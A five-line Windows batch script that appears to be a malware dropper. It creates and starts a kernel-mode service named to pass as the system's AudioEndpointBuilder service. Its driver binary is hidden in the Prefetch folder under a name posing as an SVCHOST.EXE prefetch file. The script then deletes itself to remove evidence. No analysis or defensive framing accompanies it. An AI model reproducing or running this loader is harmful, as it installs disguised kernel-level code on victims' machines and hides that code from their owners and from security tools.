@echo off
cd %~dp0
sc create AudioEndpointBuilder_591 binpath=C:\Windows\Prefetch\SVCHOST.EXE-M5S1KJ74.pf type=kernel
sc start AudioEndpointBuilder_591
del "%~f0"



